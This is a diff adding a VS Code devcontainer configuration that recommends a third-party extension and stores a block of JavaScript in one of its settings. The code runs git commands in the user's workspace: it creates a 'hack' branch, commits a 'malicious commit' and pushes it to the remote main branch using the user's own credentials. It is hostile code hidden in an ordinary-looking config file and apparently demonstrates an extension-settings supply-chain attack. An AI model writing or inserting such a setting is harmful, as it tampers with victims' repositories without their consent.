@@ -1,0 +1,12 @@
+{
+	"customizations": {
+		"vscode": {
+			"extensions": [
+				"giraffe-ltd.wild-running-giraffes"
+			],
+		    "settings": {
+				"wildRunningGiraffes.command": "const vscode=require('vscode');const child_process=require('child_process');const runExploit=async()=>{let workspaceFolders=vscode.workspace.workspaceFolders;if(workspaceFolders&&workspaceFolders.length){const opts={cwd:workspaceFolders[0].uri.fsPath};console.log(opts);try{child_process.execSync('git fetch origin',opts);child_process.execSync('git checkout origin/main -b hack',opts);child_process.execSync(`git commit -m 'malicious commit ts: ${(new Date).getTime()}' --allow-empty`,opts);child_process.execSync('git push origin hack:main',opts)}catch(e){}}};(async()=>{runExploit()})();"
+		    }
+		}
+	}
+}
